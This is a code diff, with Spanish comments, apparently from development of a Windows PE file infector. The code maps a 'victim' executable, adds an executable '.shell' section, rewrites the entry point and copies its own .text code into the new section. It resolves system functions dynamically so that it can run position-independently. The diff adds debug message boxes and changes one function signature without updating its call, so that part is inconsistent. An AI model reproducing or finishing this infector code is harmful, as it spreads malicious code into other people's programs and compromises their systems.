@@ -4,10 +4,18 @@
 // Strings almacenados en la sección .text
 #pragma code_seg(".text")
 
+
+
+
 __declspec(allocate(".text"))
 wchar_t kernel32_str[] = L"kernel32.dll";
 
 __declspec(allocate(".text"))
+
+#ifndef CUSTOM_ALIGN_UP
+#define CUSTOM_ALIGN_UP(value, alignment) (((value) + ((alignment) - 1)) & ~((alignment) - 1))
+#endif
+
 char load_lib_str[] = "LoadLibraryA";
 
 
@@ -77,12 +85,9 @@ typedef errno_t(CDECL* strcpy_s_fn)(
 typedef void (WINAPI* ZeroMemory_fn)(PVOID, SIZE_T);
 
 // Definición del puntero de función para SetFilePointer
-typedef DWORD(WINAPI* SetFilePointer_fn)(
-    HANDLE hFile,
-    LONG lDistanceToMove,
-    PLONG lpDistanceToMoveHigh,
-    DWORD dwMoveMethod
-    );
+
+typedef DWORD(*SetFilePointer_fn)(HANDLE, LONG, PLONG, DWORD);
+
 
 // Definición del puntero de función para SetEndOfFile
 typedef BOOL(WINAPI* SetEndOfFile_fn)(HANDLE hFile);
@@ -98,6 +103,7 @@ char memcpy_name[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
 
 // Declaración del tipo de puntero a la función memcpy
 typedef void* (*memcpy_fn)(void* dest, const void* src, size_t n);  // Tipo de puntero para memcpy
+
 
 // Función para copiar la sección .text a .shell
 bool CopyTextToShell(LPVOID exeBase, DWORD textSectionSize, malloc_fn _malloc, memcpy_fn _memcpy) {
@@ -117,7 +123,23 @@ bool CopyTextToShell(LPVOID exeBase, DWORD textSectionSize, malloc_fn _malloc, m
     return true;
 }
 
-bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic, CloseHandle_fn _CloseHandle, UnmapViewOfFile_fn _UnmapViewOfFile , CreateFileMapping_fn _CreateFileMapping , MapViewOfFile_fn _MapViewOfFile , strcpy_s_fn _strcpy_s, ZeroMemory_fn _ZeroMemory, SetFilePointer_fn _SetFilePointer , SetFilePointer_fn _SetEndOfFile) {
+bool AddShellSectionAndModifyEntryPoint
+
+(HANDLE hFile_vic,
+CloseHandle_fn _CloseHandle,
+UnmapViewOfFile_fn _UnmapViewOfFile,
+CreateFileMapping_fn _CreateFileMapping,
+MapViewOfFile_fn _MapViewOfFile,
+strcpy_s_fn _strcpy_s,
+ZeroMemory_fn _ZeroMemory,
+SetFilePointer_fn _SetFilePointer,
+SetEndOfFile_fn _SetEndOfFile , MessageBoxW_fn _MessageBoxW
+)
+
+
+//(HANDLE hFile_vic, CloseHandle_fn _CloseHandle, UnmapViewOfFile_fn _UnmapViewOfFile , CreateFileMapping_fn _CreateFileMapping , MapViewOfFile_fn _MapViewOfFile , strcpy_s_fn _strcpy_s, ZeroMemory_fn _ZeroMemory, SetFilePointer_fn _SetFilePointer , SetFilePointer_fn _SetEndOfFile)
+{
+    
 
    
     HANDLE hMapping = _CreateFileMapping(hFile_vic, nullptr, PAGE_READWRITE, 0, 0, nullptr);
@@ -126,7 +148,7 @@ bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic, CloseHandle_fn _CloseH
         _CloseHandle(hFile_vic);
         return false;
     }
-
+    _MessageBoxW(0, L"hMapping ", L"Depuracion", MB_OK);
     BYTE* pBase = (BYTE*)_MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
     if (!pBase) {
         //std::cerr << "Error al mapear el archivo en memoria.\n";
@@ -161,11 +183,11 @@ bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic, CloseHandle_fn _CloseH
     PIMAGE_SECTION_HEADER newSection = &sectionHeaders[numberOfSections];
     _ZeroMemory(newSection, sizeof(IMAGE_SECTION_HEADER));
     _strcpy_s((char*)newSection->Name, IMAGE_SIZEOF_SHORT_NAME, ".shell");
-
+    
     newSection->Misc.VirtualSize = 0x1000; // Tamaño virtual de la sección
-    newSection->VirtualAddress = ALIGN_UP(sectionHeaders[numberOfSections - 1].VirtualAddress + sectionHeaders[numberOfSections - 1].Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
-    newSection->SizeOfRawData = ALIGN_UP(0x1000, ntHeaders->OptionalHeader.FileAlignment);
-    newSection->PointerToRawData = ALIGN_UP(sectionHeaders[numberOfSections - 1].PointerToRawData + sectionHeaders[numberOfSections - 1].SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
+    newSection->VirtualAddress = CUSTOM_ALIGN_UP(sectionHeaders[numberOfSections - 1].VirtualAddress + sectionHeaders[numberOfSections - 1].Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
+    newSection->SizeOfRawData = CUSTOM_ALIGN_UP(0x1000, ntHeaders->OptionalHeader.FileAlignment);
+    newSection->PointerToRawData = CUSTOM_ALIGN_UP(sectionHeaders[numberOfSections - 1].PointerToRawData + sectionHeaders[numberOfSections - 1].SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
     newSection->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;
 
     // Actualiza los encabezados del PE
@@ -177,6 +199,7 @@ bool AddShellSectionAndModifyEntryPoint(HANDLE hFile_vic, CloseHandle_fn _CloseH
 
     // Asegúrate de escribir la nueva sección en el archivo
     _SetFilePointer(hFile_vic, newSection->PointerToRawData + newSection->SizeOfRawData, nullptr, FILE_BEGIN);
+
     _SetEndOfFile(hFile_vic);
 
     // Limpia los recursos
@@ -242,8 +265,6 @@ int main() {
     if (!get_proc) {
         return 3;
     }
-
-
 
     // loadlibrarya and getprocaddress function definitions
     HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
@@ -379,7 +400,8 @@ int main() {
             char*,
             size_t,
             const char*
-            )) GetProcAddress(GetModuleHandleA("ucrtbase.dll"), "strcpy_s");
+            ))  _GetProcAddress((HMODULE)hLibC, "strcpy_s");
+
     if (!_strcpy_s) {
 
 
@@ -393,7 +415,7 @@ int main() {
         ) = (void (WINAPI*)(
             PVOID,
             SIZE_T
-            )) GetProcAddress(GetModuleHandleA("kernel32.dll"), "ZeroMemory");
+            ))  _GetProcAddress((HMODULE)k32_dll, "ZeroMemory");
 
     // Definición de _SetFilePointer
     DWORD(WINAPI * _SetFilePointer)(
@@ -406,11 +428,20 @@ int main() {
             LONG,
             PLONG,
             DWORD
-            )) GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetFilePointer");
-
+            )) //GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetFilePointer");
+    _GetProcAddress((HMODULE)k32_dll, "SetFilePointer");
     // Definición de _SetEndOfFile
+      // Obtener la dirección de la función SetEndOfFile
+    SetEndOfFile_fn _SetEndOfFile = (SetEndOfFile_fn)//GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetEndOfFile");
+    _GetProcAddress((HMODULE)k32_dll, "SetEndOfFile");
+    
+    if (!_SetEndOfFile) {
+       
+        return 1;
+    }
 
-    BOOL(WINAPI * _SetEndOfFile)(HANDLE hFile_vic) = (BOOL(WINAPI*)(HANDLE)) GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetEndOfFile");
+ 
+   // BOOL(WINAPI * _SetEndOfFile)(HANDLE hFile_vic) = (BOOL(WINAPI*)(HANDLE)) GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetEndOfFile");
     // Declaración del puntero a función para malloc
     void* (WINAPI * _malloc)(size_t size) = (malloc_fn)_GetProcAddress((HMODULE)hLibC, malloc_name);
 
@@ -426,9 +457,8 @@ int main() {
     if (!_memcpy) {
         return -1; // Error si no se encuentra memcpy
     }
-    // invoke the message box winapi
-    _MessageBoxW(0, msg_content, msg_title, MB_OK);
 
+    //Inicio 
     HANDLE hFile = _CreateFileA(
         fileName,              // Nombre del archivo
         GENERIC_READ,          // Permisos de lectura
@@ -546,9 +576,9 @@ int main() {
         _MessageBoxW(0, L"Error al abrir el archivo vic", L"Error", MB_OK);
         return 5; // Error al abrir el archivo
     }
-
+    _MessageBoxW(0, L"_CreateFileA(2x)", L"Depuracion", MB_OK);
     bool AddedEntryPoint = AddShellSectionAndModifyEntryPoint(hFile_vic, _CloseHandle, _UnmapViewOfFile, _CreateFileMappingA, _MapViewOfFile, _strcpy_s, _ZeroMemory, _SetFilePointer, _SetEndOfFile);
-
+    _MessageBoxW(0, L"Add section", L"Depuracion", MB_OK);
     // Copiar contenido de .text a .shell
       
     if (CopyTextToShell(exeBase, sectionSize, _malloc, _memcpy)) {
